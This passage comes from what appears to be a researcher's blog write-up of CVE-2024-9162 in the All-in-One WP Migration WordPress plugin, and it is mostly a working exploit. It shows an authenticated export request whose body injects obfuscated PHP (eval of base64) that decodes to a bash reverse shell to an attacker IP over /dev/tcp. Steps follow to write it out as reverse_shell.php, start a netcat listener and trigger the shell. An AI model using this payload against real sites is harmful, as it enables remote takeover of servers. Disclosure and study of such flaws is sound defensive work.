  Cookie: wordpress_sec_1e8abd3ff1d2f462f071b6ee87f18dce=admin%7C1723667674%7Czq81SUmQ7zq0jft2M2D19aFUOZDjhqND0rKqJp0XIrb%7Cc65dd152f0c184235df35d5dfa28c50624b9f9a2fb01efb5077b150df76d286f; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_1e8abd3ff1d2f462f071b6ee87f18dce=admin%7C1723667674%7Czq81SUmQ7zq0jft2M2D19aFUOZDjhqND0rKqJp0XIrb%7C5c992aef75e3896a0909b9d480ae9e6505d89428c6975a490c30ce5b791c6bfe; wp-settings-time-1=1723500701
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: application/json, text/javascript, */*; q=0.01
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Referer: https://wordpress.hacker/wp-admin/admin.php?page=ai1wm_export
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  X-Requested-With: XMLHttpRequest
  Content-Length: 883
  Origin: https://wordpress.hacker
  Dnt: 1
  Sec-Gpc: 1
  Sec-Fetch-Dest: empty
  Sec-Fetch-Mode: cors
  Sec-Fetch-Site: same-origin
  Te: trailers
        action=ai1wm_export&amp;ai1wm_import=1&amp;options%5Breplace%5D%5Bold_value%5D%5B%5D=*&amp;options%5Breplace%5D%5Bold_value%5D%5B%5D=*&amp;options%5Breplace%5D%5Bold_value%5D%5B%5D=&amp;options%5Breplace%5D%5Bnew_value%5D%5B%5D=&amp;options%5Breplace%5D%5Bnew_value%5D%5B%5D=%3C%3Fphp+eval(+base64_decode(&#39;ZXhlYygiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTkyLjE2OC4xMDAuODYvNDQ0NCAwPiYxJyAiKTs%3D&#39;))%3B+%3F%3E&amp;options%5Breplace%5D%5Bnew_value%5D%5B%5D=&amp;options%5Bencrypt_password%5D=&amp;options%5Bencrypt_password_confirmation%5D=&amp;options%5Bno_spam_comments%5D=on&amp;options%5Bno_post_revisions%5D=on&amp;options%5Bno_media%5D=on&amp;options%5Bno_themes%5D=on&amp;options%5Bno_muplugins%5D=on&amp;options%5Bno_plugins%5D=on&amp;options%5Bno_database%5D=on&amp;options%5Bno_email_replace%5D=on&amp;ai1wm_manual_export=1&amp;storage=1j5v4ss1ls45&amp;file=1&amp;secret_key=OYXj1AIdQUnc&amp;priority=10&amp;archive=reverse_shell.php
</code></pre></li>
<li><img src="/posts/images/CVE-2024-9162/fivee.png" alt="Screenshot from 2024-08-12"></li>
<li>Turn off interception and let all other requests flow through until the job is completed and a download button is presented on the screen.
<ul>
<li><img src="/posts/images/CVE-2024-9162/6.png" alt="Screenshot from 2024-08-12 15-30-06"></li>
</ul>
</li>
<li>Notice that the link to the downoad is a link to a php file containing the payload <code>https://wordpress.hacker/wp-content/ai1wm-backups/reverse_shell.php</code>.</li>
<li>Fire up a netcat listener on an attacking machine to catch the reverse shell <code>nc -lnvp 4444</code>.</li>
<li>Click the download button and catch the reverse shell.
<ul>
<li><img src="/posts/images/CVE-2024-9162/7.png" alt="Screenshot from 2024-08-12 15-34-27"></li>
</ul>
</li>
</ul>
</li>
</ul>

  
  <hr>
<div class="footer">
    
	    
            <a class="previous-post" href="https://ryankozak.com/posts/hack-the-box-armageddon-writeup/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Hack the Box Armageddon Writeup</a>
        
	    
            <div class="next-post">
                <a href="https://ryankozak.com/posts/cve-2024-13869/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Migration,Backup, Staging – WPvivid &lt;= 0.9.112 -...</a>
            </div>
        
    
</div>

  
</div>
            </main>
            
  

        </div>
    </body>
</html>
